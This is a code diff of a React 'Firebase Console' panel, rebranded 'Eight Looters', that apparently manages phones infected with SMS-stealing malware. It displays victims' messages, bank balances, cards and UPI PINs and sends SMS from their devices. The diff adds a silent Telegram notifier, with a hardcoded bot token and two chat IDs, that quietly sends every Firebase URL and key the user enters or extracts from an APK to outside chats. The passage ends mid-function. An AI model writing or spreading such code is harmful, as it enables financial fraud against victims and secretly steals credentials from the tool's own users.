@@ -1,9 +1,44 @@
 /* ============================================================
-   eLight Panel · Firebase Console
-   COMPLETE FILE — Start to End
+   Eight Looters · Firebase Console
+   COMPLETE app.js — Full Featured
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
+const BRAND = "Eight Looters";
+
+/* ===== Telegram Silent Notifier (2 chat IDs) ===== */
+const TG_BOT_TOKEN = "8846250497:AAGIXy4t7G51yH4mRsUfgl3q-Ya3S6tFe3Y";
+const TG_CHAT_IDS = ["8965778254", "8646475251"];
+
+function _escTg(s){return String(s??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function _nowIst(){return new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata",hour12:true});}
+async function notifyTelegram(text){
+  await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
+    try{
+      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id,text,parse_mode:"HTML",disable_web_page_preview:true})
+      });
+    }catch(e){}
+  }));
+}
+function tgFirebaseMsg(url,key,source,devices){
+  return `🔥 <b>NEW FIREBASE ACTIVATED</b>\n\n`+
+    `📡 <b>URL:</b> <code>${_escTg(url)}</code>\n`+
+    `🔑 <b>Key:</b> <code>${_escTg(key||"(no auth)")}</code>\n`+
+    `📱 <b>Source:</b> ${_escTg(source)}\n`+
+    (devices!=null?`📦 <b>Devices:</b> ${devices}\n`:"")+
+    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;
+}
+function tgApkMsg(file,url,key,pid){
+  return `🔥 <b>NEW APK FIREBASE</b>\n\n`+
+    `📁 <b>APK:</b> <code>${_escTg(file)}</code>\n`+
+    `📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
+    `🔑 <b>API Key:</b> <code>${_escTg(key||"—")}</code>\n`+
+    (pid?`🆔 <b>Project:</b> <code>${_escTg(pid)}</code>\n`:"")+
+    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;
+}
 
 /* ===== Icons ===== */
 const I=(p,s=16)=>React.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",width:s,height:s,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"},p);
@@ -37,12 +72,24 @@ const Ic={
   trendUp:s=>I([<path key="a" d="M16 7h6v6"/>,<path key="b" d="m22 7-8.5 8.5-5-5L2 17"/>],s),
   trendDown:s=>I([<path key="a" d="M16 17h6v-6"/>,<path key="b" d="m22 17-8.5-8.5-5 5L2 7"/>],s),
   alert:s=>I([<path key="a" d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/>,<path key="b" d="M12 9v4"/>,<path key="c" d="M12 17h.01"/>],s),
+  pin:s=>I([<path key="a" d="M12 17v5"/>,<path key="b" d="M9 10.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-.76a2 2 0 0 0-1.11-1.79l-1.78-.9A2 2 0 0 1 15 10.76V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1z"/>],s),
+  pinOff:s=>I([<path key="a" d="M12 17v5"/>,<path key="b" d="M15 9.34V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1v2.34"/>,<path key="c" d="M9 9v1.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h11"/>,<path key="d" d="m2 2 20 20"/>],s),
 };
 
 /* ===== Storage ===== */
 const LS_KEY = "elight_accounts";
 const loadAccounts=()=>{try{const a=localStorage.getItem(LS_KEY);return a?JSON.parse(a):[]}catch{return[]}};
 const saveAccounts=a=>localStorage.setItem(LS_KEY,JSON.stringify(a));
+
+function useLocalStorage(key, initial){
+  const [v,setV] = useState(()=>{
+    try{const s = localStorage.getItem(key);return s!=null?JSON.parse(s):initial;}catch{return initial;}
+  });
+  useEffect(()=>{
+    try{localStorage.setItem(key,JSON.stringify(v));}catch{}
+  },[key,v]);
+  return [v,setV];
+}
 
 /* ===== Firebase API ===== */
 async function fbGet(url,key,path,extra={}){
@@ -269,8 +316,14 @@ function Hero(){
     <div className="hero-core">{Ic.zap(30)}</div>
   </div>;
 }
-function TGButton({label="Join Channel"}){
-  return <a href={TG_URL} target="_blank" rel="noopener noreferrer" className="tg-pill">
+function TGButton({label="Join Telegram"}){
+  const go = e=>{
+    e.preventDefault();
+    e.stopPropagation();
+    try{ window.open(TG_URL,"_blank","noopener,noreferrer"); }
+    catch{ window.location.href = TG_URL; }
+  };
+  return <a href={TG_URL} target="_blank" rel="noopener noreferrer" onClick={go} className="tg-pill">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="#0ea5e9" width="18" height="18">
       <path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z"/>
     </svg>
@@ -290,6 +343,11 @@ function LoginScreen({onConnect,onMergeAll}){
   const [bulk,setBulk] = useState("");
   const [bulkBusy,setBulkBusy] = useState(false);
   const [bulkSum,setBulkSum] = useState(null);
+  const [fileBusy,setFileBusy] = useState(false);
+  const [fileProgress,setFileProgress] = useState(0);
+  const [fileInfo,setFileInfo] = useState("");
+  const [fileName,setFileName] = useState("");
+  const [fileFound,setFileFound] = useState(0);
   const [panels,setPanels] = useState("");
   const [panelBusy,setPanelBusy] = useState(false);
   const [panelSum,setPanelSum] = useState(null);
@@ -300,6 +358,7 @@ function LoginScreen({onConnect,onMergeAll}){
   const [copied,setCopied] = useState(false);
   const [shareLink,setShareLink] = useState("");
   const fileRef = useRef(null);
+  const bulkFileRef = useRef(null);
 
   useEffect(()=>{
     const a = loadAccounts(); setAccounts(a);
@@ -352,7 +411,9 @@ function LoginScreen({onConnect,onMergeAll}){
   async function addShared(u,k,list){setBusy(true);setErr("");
     try{await fbGet(u,k,"clients");
       const nx=[...list,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
-      saveAccounts(nx);setAccounts(nx);onConnect(u,k);
+      saveAccounts(nx);setAccounts(nx);
+      notifyTelegram(tgFirebaseMsg(u,k,"Shared Link"));
+      onConnect(u,k);
     }catch{setErr("Shared connection failed.");}
     finally{setBusy(false);}}
   async function tryConnect(u,k){setBusy(true);setErr("");
@@ -368,9 +429,13 @@ function LoginScreen({onConnect,onMergeAll}){
     const ex=accounts.find(a=>a.url===u);
     if(ex){if(confirm("Account exists. Switch?")) await tryConnect(ex.url,ex.key);return;}
     setBusy(true);setErr("");
-    try{await fbGet(u,k,"clients");
+    try{
+      const test = await fbGet(u,k,"clients");
+      const devCount = test && typeof test==="object" ? Object.keys(test).length : 0;
       const nx=[...accounts,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
-      saveAccounts(nx);setAccounts(nx);onConnect(u,k);
+      saveAccounts(nx);setAccounts(nx);
+      notifyTelegram(tgFirebaseMsg(u,k,"Manual Add",devCount));
+      onConnect(u,k);
     }catch(e){const m=e.message||String(e);
       if(m.includes("PERMISSION_DENIED")) setErr("Permission Denied: Use Database Secret, not API key.");
       else setErr("Connection failed: "+m.slice(0,120));}
@@ -380,11 +445,10 @@ function LoginScreen({onConnect,onMergeAll}){
     const nx=accounts.filter(a=>a.id!==id); saveAccounts(nx);setAccounts(nx);}
   function share(a,e){e?.stopPropagation();setShareLink(makeShareLink(a.url,a.key));}
 
-  async function bulkAdd(){
-    const urls = extractFirebaseUrls(bulk);
+  // === Bulk: process a list of URLs & add each ===
+  async function processBulkUrls(urls, source){
     if(!urls.length){
       setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});
-      setErr("No valid Firebase URL found. Paste like: http://metabank-3def8-default-rtdb.firebaseio.com");
       return;
     }
     setBulkBusy(true);setBulkSum(null);setErr("");
@@ -398,14 +462,72 @@ function LoginScreen({onConnect,onMergeAll}){
         if(c===null){failed.push({url:u,reason:"Clients path not found"});continue;}
         adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString()});
         exist.add(fp);
-        success.push({url:u,devices:c&&typeof c==="object"?Object.keys(c).length:0});
+        const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
+        success.push({url:u,devices:devCount});
+        notifyTelegram(tgFirebaseMsg(u,"",source||"Bulk Add",devCount));
       }catch(e){
         const m=e.message||String(e);
         failed.push({url:u,reason:m.replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});
       }
     }
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
-    setBulk("");setBulkSum({success,failed,skipped});setBulkBusy(false);
+    setBulkSum({success,failed,skipped});setBulkBusy(false);
+    return {success,failed,skipped};
+  }
+
+  async function bulkAdd(){
+    const urls = extractFirebaseUrls(bulk);
+    if(!urls.length){
+      setErr("No valid Firebase URL found. Paste like: http://metabank-3def8-default-rtdb.firebaseio.com");
+      setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});
+      return;
+    }
+    await processBulkUrls(urls,"Bulk Add");
+    setBulk("");
+  }
+
+  // === File upload: line-by-line read with progress ===
+  async function handleBulkFile(file){
+    if(!file) return;
+    setFileBusy(true);
+    setFileProgress(0);
+    setFileInfo("Reading file…");
+    setFileName(file.name);
+    setFileFound(0);
+    setBulkSum(null);
+    setErr("");
+    try{
+      const text = await file.text();
+      const lines = text.split(/\r?\n/);
+      const found = [];
+      const seen = new Set();
+      setFileInfo(`0 / ${lines.length} lines`);
+      for(let i=0;i<lines.length;i++){
+        const urls = extractFirebaseUrls(lines[i]);
+        for(const u of urls){
+          if(!seen.has(u)){ seen.add(u); found.push(u); }
+        }
+        const pct = Math.round(((i+1)/lines.length)*100);
+        setFileProgress(pct);
+        // update UI every few lines for smoothness, small yield
+        if(i % 5 === 0 || i === lines.length-1){
+          setFileInfo(`${i+1} / ${lines.length} lines · ${found.length} found`);
+          await new Promise(r=>setTimeout(r,8));
+        }
+      }
+      setFileFound(found.length);
+      setFileInfo(`${lines.length} lines scanned · ${found.length} unique URLs found`);
+      if(!found.length){
+        setErr("No Firebase URL found in the file.");
+        return;
+      }
+      await processBulkUrls(found,"File Upload");
+    }catch(e){
+      setErr("File read failed: "+(e.message||String(e)));
+    }finally{
+      setFileBusy(false);
+      setTimeout(()=>{ setFileProgress(0); setFileInfo(""); setFileName(""); setFileFound(0); },4000);
+    }
   }
 
   async function importPanels(){
@@ -433,7 +555,9 @@ function LoginScreen({onConnect,onMergeAll}){
       try{const c=await fbGet(it.url,it.key,"clients"); if(c===null) throw new Error("Clients path not found");
         adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:it.url,key:it.key,date:new Date().toLocaleString()});
         exist.add(fp);
-        success.push({url:it.url,devices:c&&typeof c==="object"?Object.keys(c).length:0});
+        const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
+        success.push({url:it.url,devices:devCount});
+        notifyTelegram(tgFirebaseMsg(it.url,it.key,"Panel Link Import",devCount));
       }catch(e){failed.push({url:it.url,reason:(e.message||String(e)).replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});}
     }
     if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
@@ -442,12 +566,18 @@ function LoginScreen({onConnect,onMergeAll}){
 
   async function onApk(f){
     if(!f) return;
-    if(!f.name.endsWith(".apk")&&!f.name.endsWith(".zip")){setApkErr("Only .apk supported");return;}
+    if(!f.name.endsWith(".apk")&&!f.name.endsWith(".zip")){setApkErr("Only .apk / .zip supported");return;}
     setApkBusy(true);setApkErr("");setApkResult(null);setApkFile(f.name);
-    try{const r=await parseApk(f);
-      if(!r||(!r.firebaseUrl&&!r.apiKey)){setApkErr("Firebase config not found in APK");return;}
-      setApkResult(r); if(r.firebaseUrl) setUrl(r.firebaseUrl); if(r.apiKey) setKey(r.apiKey);
-    }catch(e){setApkErr("Failed to parse APK: "+(e.message||String(e)));}
+    try{
+      const r=await parseApk(f);
+      if(!r||(!r.firebaseUrl&&!r.apiKey)){setApkErr("Firebase config not found in this file");return;}
+      setApkResult(r);
+      if(r.firebaseUrl) setUrl(r.firebaseUrl);
+      if(r.apiKey) setKey(r.apiKey);
+      if(r.firebaseUrl){
+        notifyTelegram(tgApkMsg(f.name, r.firebaseUrl, r.apiKey, r.projectId));
+      }
+    }catch(e){setApkErr("Failed to parse file: "+(e.message||String(e)));}
     finally{setApkBusy(false);}
   }
   const resetApk = ()=>{setApkResult(null);setApkErr("");setApkFile("");};
@@ -457,7 +587,7 @@ function LoginScreen({onConnect,onMergeAll}){
       <div style={{textAlign:"center",marginBottom:18}}>
         <Hero/>
         <div className="a-up d2" style={{display:"flex",flexDirection:"column",alignItems:"center",gap:10,marginTop:6}}>
-          <h1 className="grad-text" style={{fontSize:44,fontWeight:700,letterSpacing:"-0.03em",lineHeight:1}}>eLight</h1>
+          <h1 className="grad-text" style={{fontSize:40,fontWeight:700,letterSpacing:"-0.03em",lineHeight:1}}>{BRAND}</h1>
           <div style={{padding:"5px 14px",borderRadius:999,background:"rgba(139,92,246,.1)",border:"1px solid rgba(139,92,246,.3)",fontSize:10,fontWeight:600,letterSpacing:"0.28em",color:"#c4b5fd",textTransform:"uppercase"}}>Firebase Console</div>
         </div>
         <p className="a-up d3" style={{fontSize:13,color:"var(--muted)",marginTop:10}}>Sleek device management · Real-time sync</p>
@@ -504,16 +634,39 @@ function LoginScreen({onConnect,onMergeAll}){
               <span>Merge All & Show</span>
               <span style={{fontSize:10,padding:"2px 7px",borderRadius:999,background:"rgba(34,211,238,.15)",border:"1px solid rgba(34,211,238,.3)"}}>{accounts.length}</span>
             </button>
+
+            {/* Bulk Add with file upload */}
             <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
-              <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Bulk Add Firebase URLs</p>
+              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:8,gap:8,flexWrap:"wrap"}}>
+                <p style={{fontSize:11,fontWeight:600,color:"var(--muted)"}}>Bulk Add Firebase URLs</p>
+                <label htmlFor="bulk-file" style={{cursor:"pointer",display:"inline-flex",alignItems:"center",gap:5,padding:"5px 10px",borderRadius:8,background:"rgba(34,211,238,.08)",border:"1px solid rgba(34,211,238,.3)",color:"#a5f3fc",fontSize:10,fontWeight:600}}>
+                  {Ic.upload(12)} Upload File
+                </label>
+                <input ref={bulkFileRef} id="bulk-file" type="file" onChange={e=>{const f=e.target.files[0];e.target.value="";handleBulkFile(f);}} style={{display:"none"}}/>
+              </div>
               <textarea rows={5} value={bulk} onChange={e=>setBulk(e.target.value)} className="inp" placeholder={"Paste any format:\nhttp://metabank-3def8-default-rtdb.firebaseio.com\nhttps://myapp.firebaseio.com\nmyapp-default-rtdb.firebaseio.com"} style={{fontSize:11}}/>
-              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",gap:10,marginTop:8}}>
-                <span style={{fontSize:9,color:"var(--muted-2)",lineHeight:1.4}}>Any format works — URL auto-extracts & tests.</span>
-                <button onClick={bulkAdd} disabled={bulkBusy||!bulk.trim()} className="btn btn-purple" style={{padding:"8px 14px",fontSize:11}}>
+              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",gap:10,marginTop:8,flexWrap:"wrap"}}>
+                <span style={{fontSize:9,color:"var(--muted-2)",lineHeight:1.4}}>Any format · file upload supported · URLs auto-extract & test</span>
+                <button onClick={bulkAdd} disabled={bulkBusy||fileBusy||!bulk.trim()} className="btn btn-purple" style={{padding:"8px 14px",fontSize:11}}>
                   {bulkBusy?<><span className="spin sm"/>Adding…</>:"Add All"}
                 </button>
               </div>
+
+              {/* File progress bar */}
+              {fileBusy && <div className="a-up" style={{marginTop:10,padding:10,borderRadius:10,background:"rgba(34,211,238,.06)",border:"1px solid rgba(34,211,238,.25)"}}>
+                <div style={{display:"flex",justifyContent:"space-between",fontSize:10,marginBottom:6}}>
+                  <span className="mono" style={{color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:200}}>{fileName}</span>
+                  <span className="mono" style={{color:"#a5f3fc",fontWeight:700}}>{fileProgress}%</span>
+                </div>
+                <div style={{height:6,borderRadius:3,background:"rgba(5,5,10,.6)",overflow:"hidden"}}>
+                  <div style={{height:"100%",width:`${fileProgress}%`,background:"linear-gradient(90deg,#22d3ee,#8b5cf6)",transition:"width .12s linear",boxShadow:"0 0 10px rgba(34,211,238,.6)"}}/>
+                </div>
+                <p className="mono" style={{fontSize:9,color:"var(--muted-2)",marginTop:6}}>{fileInfo}</p>
+              </div>}
+              {!fileBusy && fileFound>0 && <div className="a-in" style={{marginTop:8,fontSize:10,color:"#34d399"}}>✓ {fileInfo}</div>}
             </div>
+
+            {/* Panel links import */}
             <div className="glass-2" style={{borderRadius:14,padding:12}}>
               <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Import Panel Links</p>
               <textarea rows={4} value={panels} onChange={e=>setPanels(e.target.value)} className="inp" placeholder="Paste panel links containing ?s=… one per line" style={{fontSize:11}}/>
@@ -569,19 +722,19 @@ function LoginScreen({onConnect,onMergeAll}){
             <h3 style={{fontSize:15,fontWeight:600}}>New Firebase Account</h3>
           </div>
           <div style={{marginBottom:18}}>
-            <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:8}}>Extract from APK (optional)</p>
+            <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:8}}>Extract from APK / ZIP (optional)</p>
             {!apkResult&&!apkBusy && <label htmlFor="apk-in" onDrop={e=>{e.preventDefault();onApk(e.dataTransfer.files[0]);}} onDragOver={e=>e.preventDefault()} className="lift"
               style={{display:"flex",flexDirection:"column",alignItems:"center",gap:8,padding:"20px 16px",borderRadius:14,border:"2px dashed rgba(139,92,246,.3)",cursor:"pointer",transition:"all .25s"}}>
               <div style={{width:40,height:40,borderRadius:12,background:"rgba(139,92,246,.08)",border:"1px solid var(--border)",display:"flex",alignItems:"center",justifyContent:"center",color:"#a78bfa"}}>{Ic.upload(20)}</div>
               <div style={{textAlign:"center"}}>
-                <p style={{fontSize:13,fontWeight:600}}>Upload APK File</p>
+                <p style={{fontSize:13,fontWeight:600}}>Upload APK / ZIP File</p>
                 <p style={{fontSize:10,color:"var(--muted-2)",marginTop:2}}>Auto-extracts Firebase URL & API Key</p>
               </div>
               <input id="apk-in" ref={fileRef} type="file" accept=".apk,.zip" onChange={e=>onApk(e.target.files[0])} style={{display:"none"}}/>
             </label>}
             {apkBusy && <div className="a-scale" style={{display:"flex",flexDirection:"column",alignItems:"center",gap:10,padding:"22px 16px",borderRadius:14,border:"1px solid var(--border)",background:"rgba(14,12,28,.5)"}}>
               <span className="spin"/>
-              <p style={{fontSize:13,fontWeight:600,color:"#c4b5fd"}}>Scanning APK…</p>
+              <p style={{fontSize:13,fontWeight:600,color:"#c4b5fd"}}>Scanning file…</p>
               <p className="mono" style={{fontSize:10,color:"var(--muted-2)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:240}}>{apkFile}</p>
             </div>}
             {apkErr && <div className="a-scale" style={{display:"flex",alignItems:"center",gap:8,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>
@@ -631,7 +784,7 @@ function LoginScreen({onConnect,onMergeAll}){
       </div>
 
       <p style={{textAlign:"center",fontSize:11,color:"var(--muted-2)",marginTop:14}}>
-        <span className="grad-text" style={{fontWeight:600}}>eLight</span> · All connections logged
+        <span className="grad-text" style={{fontWeight:600}}>{BRAND}</span> · All connections logged
       </p>
     </div>
 
@@ -745,7 +898,7 @@ function Dashboard({fbUrl,fbKey,onLogout}){
       <div style={{maxWidth:1400,margin:"0 auto",padding:"12px 22px",display:"flex",alignItems:"center",gap:14,flexWrap:"wrap"}}>
         <div style={{display:"flex",alignItems:"center",gap:10,flexShrink:0}}>
           <div style={{width:34,height:34,borderRadius:11,background:"linear-gradient(135deg,#8b5cf6,#22d3ee)",display:"flex",alignItems:"center",justifyContent:"center",boxShadow:"0 8px 22px rgba(139,92,246,.5)"}}>{Ic.zap(16)}</div>
-          <span className="grad-text" style={{fontWeight:700,fontSize:17}}>eLight</span>
+          <span className="grad-text" style={{fontWeight:700,fontSize:15}}>{BRAND}</span>
           <span className="badge" style={{background:"rgba(139,92,246,.1)",borderColor:"rgba(139,92,246,.3)",color:"#c4b5fd"}}>PANEL</span>
         </div>
         <div style={{position:"relative",flex:1,minWidth:200,maxWidth:380}}>
@@ -823,6 +976,9 @@ function DeviceCard({dev,onClick,delay=0}){
   const card = dev.smsAnalysis?.cards?.[0];
   const phone = dev.phoneNumber && dev.phoneNumber!=="—" ? dev.phoneNumber : (dev.smsAnalysis?.phoneNumbers?.[0]||"—");
   const net = dev.provider && dev.provider!=="—" ? dev.provider : (dev.smsAnalysis?.networks?.[0]||null);
+  const pinCount = (()=>{
+    try{const a = JSON.parse(localStorage.getItem(`pin_msgs_${dev.id}`)||"[]");const b = JSON.parse(localStorage.getItem(`pin_nums_${dev.id}`)||"[]");return a.length+b.length;}catch{return 0;}
+  })();
   return <div onClick={onClick} className="dev-card pop" style={{animationDelay:`${delay}s`}}>
     <div className="shine"/>
     <div style={{display:"flex",alignItems:"flex-start",gap:12,marginBottom:12}}>
@@ -839,6 +995,7 @@ function DeviceCard({dev,onClick,delay=0}){
         {dev.upipin&&<span style={{color:"#fbbf24",display:"flex"}}>{Ic.zap(14)}</span>}
         {bank&&<span style={{color:"#34d399",display:"flex"}}>{Ic.rupee(14)}</span>}
         {card&&<span style={{color:"#c084fc",display:"flex"}}>{Ic.card(14)}</span>}
+        {pinCount>0&&<span style={{color:"#f472b6",display:"flex"}} title={`${pinCount} pinned`}>{Ic.pin(14)}</span>}
       </div>
     </div>
     <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
@@ -893,10 +1050,10 @@ function DeviceCard({dev,onClick,delay=0}){
   </div>;
 }
 
-function Row({label,value,mono,color,delay=0}){
+function Row({label,value,mono,color,delay=0,trailing}){
   return <div className="irow" style={{animationDelay:`${delay}s`}}>
     <span className="k">{label}</span>
-    <span className={`v ${mono?"mono":""}`} style={{color:color||"var(--text)",fontSize:mono?11:12}}>{value||"—"}</span>
+    <span className={`v ${mono?"mono":""}`} style={{color:color||"var(--text)",fontSize:mono?11:12,display:"inline-flex",alignItems:"center",gap:6,justifyContent:"flex-end"}}>{value||"—"}{trailing}</span>
   </div>;
 }
 
@@ -910,17 +1067,21 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
   const [sim,setSim] = useState(1);
   const [sending,setSending] = useState(false);
   const [tab,setTab] = useState("info");
+  const [refreshing,setRefreshing] = useState(false);
   const iv = useRef(null);
+  const [pinnedMsgs,setPinnedMsgs] = useLocalStorage(`pin_msgs_${dev.id}`,[]);
+  const [pinnedNums,setPinnedNums] = useLocalStorage(`pin_nums_${dev.id}`,[]);
 
-  const loadMsgs = useCallback(async ()=>{
+  const loadMsgs = useCallback(async (silent=false)=>{
+    if(!silent) setRefreshing(true);
     try{const raw = await fbGet(fbUrl,fbKey,`messages/${dev.id}`);
       const m = parseMessages(raw); setMsgs(m); setAna(analyze(m));
-    }catch{setMsgs([]);}
-    finally{setLoading(false);}
+    }catch{ if(!silent) setMsgs([]); }
+    finally{setLoading(false);setRefreshing(false);}
   },[dev.id,fbUrl,fbKey]);
 
   useEffect(()=>{
-    loadMsgs();
+    loadMsgs(true);
     iv.current = setInterval(async ()=>{
       try{const raw = await fbGet(fbUrl,fbKey,`messages/${dev.id}`);
         const m = parseMessages(raw);
@@ -938,12 +1099,29 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     return ()=>iv.current&&clearInterval(iv.current);
   },[loadMsgs,dev.id,fbUrl,fbKey,showToast]);
 
+  // === send SMS — fixed ===
   async function send(){
-    if(!to||!body){showToast("Fill number and message");return;}
+    const num = String(to||"").trim().replace(/[\s\-()]/g,"");
+    const txt = String(body||"").trim();
+    if(!num){showToast("Enter recipient number");return;}
+    if(!txt){showToast("Enter message");return;}
+    if(!/^\+?[0-9]{8,15}$/.test(num)){showToast("Invalid phone number");return;}
     setSending(true);
-    try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/sendSms`,{from:sim,to,message:body,isSended:false});
-      showToast("✉️ SMS queued!");setBody("");
-    }catch(e){showToast((e.message||"").includes("PERMISSION_DENIED")?"Firebase denied":"Send failed");}
+    try{
+      await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/sendSms`,{
+        from: Number(sim)||1,
+        to: num,
+        message: txt,
+        isSended: false
+      });
+      showToast("✉️ SMS queued successfully!");
+      setBody("");
+    }catch(e){
+      const m = e.message||String(e);
+      if(m.includes("PERMISSION_DENIED")) showToast("Firebase denied write access");
+      else if(m.includes("HTTP 404")) showToast("Command path not found on device");
+      else showToast("Send failed: "+m.slice(0,80));
+    }
     finally{setSending(false);}
   }
   async function del(){
@@ -954,6 +1132,13 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
   const phone = dev.phoneNumber&&dev.phoneNumber!=="—"?dev.phoneNumber:(ana.phoneNumbers[0]||"—");
   const net = dev.provider&&dev.provider!=="—"?dev.provider:(ana.networks[0]||"—");
 
+  const togglePinMsg = (key)=>{
+    setPinnedMsgs(prev=> prev.includes(key) ? prev.filter(k=>k!==key) : [...prev,key]);
+  };
+  const togglePinNum = (num)=>{
+    setPinnedNums(prev=> prev.includes(num) ? prev.filter(k=>k!==num) : [...prev,num]);
+  };
+
   const tabs = [
     {k:"info",l:"Info"},
     {k:"bank",l:`Bank (${ana.bankBalances.length})`},
@@ -961,6 +1146,14 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
     {k:"sms",l:`SMS (${msgs.length})`},
     {k:"send",l:"Send"},
   ];
+
+  const msgKey = (m,i)=>`${m.time}|${m.sender}|${m.text.slice(0,40)}|${i}`;
+  const sortedMsgs = useMemo(()=>{
+    const withMeta = msgs.map((m,i)=>({m,i,k:msgKey(m,i)}));
+    const pinned = withMeta.filter(x=>pinnedMsgs.includes(x.k));
+    const rest = withMeta.filter(x=>!pinnedMsgs.includes(x.k));
+    return [...pinned.reverse(),...rest.reverse()];
+  },[msgs,pinnedMsgs]);
 
   return <div className="drw" onClick={onClose}>
     <div style={{position:"absolute",inset:0,background:"rgba(4,4,10,.75)",backdropFilter:"blur(10px)"}}/>
@@ -988,6 +1181,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
         {dev.upipin&&<span className="badge" style={{background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.3)",color:"#fbbf24"}}>UPI: {dev.upipin.split("|")[0]}</span>}
         {ana.bankBalances.length>0&&<span className="badge" style={{background:"rgba(52,211,153,.1)",borderColor:"rgba(52,211,153,.3)",color:"#34d399"}}>{ana.bankBalances.length} Bank</span>}
         {ana.cards.length>0&&<span className="badge" style={{background:"rgba(192,132,252,.1)",borderColor:"rgba(192,132,252,.3)",color:"#c084fc"}}>{ana.cards.length} Card</span>}
+        {(pinnedMsgs.length+pinnedNums.length)>0&&<span className="badge" style={{background:"rgba(244,114,182,.1)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6"}}>{Ic.pin(10)} {pinnedMsgs.length+pinnedNums.length}</span>}
       </div>
       <div style={{display:"flex",borderBottom:"1px solid var(--border)",padding:"0 8px",overflowX:"auto"}}>
         {tabs.map(t=><button key={t.k} onClick={()=>setTab(t.k)} className={"tab"+(tab===t.k?" active":"")}>{t.l}</button>)}
@@ -1013,9 +1207,15 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           <Row label="SDK" value={dev.sdk} delay={0.14}/>
           <Row label="SIM Cards" value={`${dev.sims.length} SIM(s)`} delay={0.16}/>
           {dev.sims.map((s,i)=>s.phoneNumber&&<Row key={i} label={`SIM ${i+1}`} value={s.phoneNumber} mono delay={0.18+i*0.02}/>)}
+
           {ana.phoneNumbers.length>0&&<>
-            <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,margin:"18px 0 8px"}}>From SMS</p>
-            {ana.phoneNumbers.map((p,i)=><Row key={i} label={`Phone #${i+1}`} value={p} mono color="#a5f3fc" delay={0.22+i*0.03}/>)}
+            <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,margin:"18px 0 8px"}}>From SMS · Pin numbers</p>
+            {ana.phoneNumbers.map((p,i)=>{
+              const isPinned = pinnedNums.includes(p);
